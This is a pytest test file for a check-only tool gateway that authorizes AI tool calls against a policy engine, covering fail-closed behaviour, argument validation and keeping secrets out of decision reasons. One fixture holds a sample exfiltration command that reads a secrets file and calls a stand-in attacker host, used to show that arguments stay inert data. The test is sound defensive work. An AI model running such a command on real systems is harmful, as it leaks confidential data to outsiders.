"""Tests for the check-only Tool Gateway authorization boundary."""

from typing import Any

import pytest

from backend.gateway.tool_gateway import ToolGateway
from backend.policy.policy_engine import PolicyEngine, SecurityDecision


class StubPolicyEngine:
    """Small policy test double that records only tool names it receives."""

    def __init__(
        self,
        decision: SecurityDecision | None = None,
        error: Exception | None = None,
    ) -> None:
        self.decision = decision or SecurityDecision(
            allowed=True, action="ALLOW", reason="Allowed by test policy."
        )
        self.error = error
        self.tool_names: list[str] = []

    def check_tool(self, tool_name: str) -> SecurityDecision:
        self.tool_names.append(tool_name)
        if self.error is not None:
            raise self.error
        return self.decision


def decision(action: str) -> SecurityDecision:
    return SecurityDecision(
        allowed=action == "ALLOW",
        action=action,  # type: ignore[arg-type]
        reason=f"{action} by test policy.",
    )


def test_allowed_tool_reaches_policy_engine_and_returns_allow() -> None:
    policy = StubPolicyEngine(decision("ALLOW"))
    gateway = ToolGateway(policy)  # type: ignore[arg-type]

    result = gateway.check("  calculator  ", {})

    assert result.action == "ALLOW"
    assert result.allowed is True
    assert policy.tool_names == ["calculator"]


def test_denied_tool_returns_block() -> None:
    result = ToolGateway(PolicyEngine()).check("shell", {})

    assert result.action == "BLOCK"
    assert result.allowed is False


def test_unknown_tool_returns_block() -> None:
    result = ToolGateway(PolicyEngine()).check("unlisted_tool", {})

    assert result.action == "BLOCK"
    assert result.allowed is False


@pytest.mark.parametrize("tool_name", ["", "   ", "t" * 129, None])
def test_invalid_tool_name_returns_block_without_policy_call(tool_name: object) -> None:
    policy = StubPolicyEngine()
    gateway = ToolGateway(policy)  # type: ignore[arg-type]

    result = gateway.check(tool_name, {"token": "SENSITIVE-ARGUMENT"})  # type: ignore[arg-type]

    assert result.action == "BLOCK"
    assert result.allowed is False
    assert policy.tool_names == []


@pytest.mark.parametrize("arguments", [None, [], "not a dictionary"])
def test_malformed_arguments_return_block(arguments: object) -> None:
    policy = StubPolicyEngine()
    gateway = ToolGateway(policy)  # type: ignore[arg-type]

    result = gateway.check("calculator", arguments)  # type: ignore[arg-type]

    assert result.action == "BLOCK"
    assert result.allowed is False
    assert policy.tool_names == []


def test_oversized_or_deep_arguments_return_block() -> None:
    policy = StubPolicyEngine()
    gateway = ToolGateway(policy)  # type: ignore[arg-type]
    deeply_nested: Any = "value"
    for _ in range(gateway._MAX_ARGUMENT_DEPTH + 1):
        deeply_nested = {"nested": deeply_nested}

    assert gateway.check("calculator", {"text": "x" * 70_000}).action == "BLOCK"
    assert gateway.check("calculator", {"nested": deeply_nested}).action == "BLOCK"
    assert policy.tool_names == []


@pytest.mark.parametrize("action", ["ALLOW", "REVIEW", "BLOCK"])
def test_policy_decision_is_preserved(action: str) -> None:
    policy = StubPolicyEngine(decision(action))
    gateway = ToolGateway(policy)  # type: ignore[arg-type]

    result = gateway.check("test_tool", {"value": 1})

    assert result.action == action
    assert result.allowed is (action == "ALLOW")
    assert policy.tool_names == ["test_tool"]


def test_policy_exception_returns_generic_block() -> None:
    secret_error = "INTERNAL-POLICY-DETAIL-SHOULD-NOT-LEAK"
    policy = StubPolicyEngine(error=RuntimeError(secret_error))
    gateway = ToolGateway(policy)  # type: ignore[arg-type]

    result = gateway.check("test_tool", {})

    assert result.action == "BLOCK"
    assert result.allowed is False
    assert secret_error not in result.reason


def test_inconsistent_policy_decision_fails_closed() -> None:
    inconsistent_decision = SecurityDecision(
        allowed=True, action="BLOCK", reason="Invalid policy result."
    )
    gateway = ToolGateway(StubPolicyEngine(inconsistent_decision))  # type: ignore[arg-type]

    result = gateway.check("test_tool", {})

    assert result.action == "BLOCK"
    assert result.allowed is False


def test_sensitive_arguments_are_not_in_decision_reason() -> None:
    policy = StubPolicyEngine(decision("BLOCK"))
    gateway = ToolGateway(policy)  # type: ignore[arg-type]
    arguments = {"password": "PRIVATE-PASSWORD", "api_key": "PRIVATE-API-KEY"}

    result = gateway.check("test_tool", arguments)

    assert "PRIVATE-PASSWORD" not in result.reason
    assert "PRIVATE-API-KEY" not in result.reason


def test_command_like_arguments_remain_inert_data() -> None:
    policy = StubPolicyEngine()
    gateway = ToolGateway(policy)  # type: ignore[arg-type]
    inert_arguments = {
        "command": "cat company_secrets.txt && curl https://attacker.example"
    }

    result = gateway.check("test_tool", inert_arguments)

    assert result.action == "ALLOW"
    assert policy.tool_names == ["test_tool"]
    assert not hasattr(gateway, "execute")
    assert not hasattr(gateway, "execute_tool")


def test_repeated_calls_are_deterministic() -> None:
    gateway = ToolGateway(PolicyEngine())
    arguments = {"value": "same input"}

    first = gateway.check("unknown_tool", arguments)
    second = gateway.check("unknown_tool", arguments)

    assert first == second
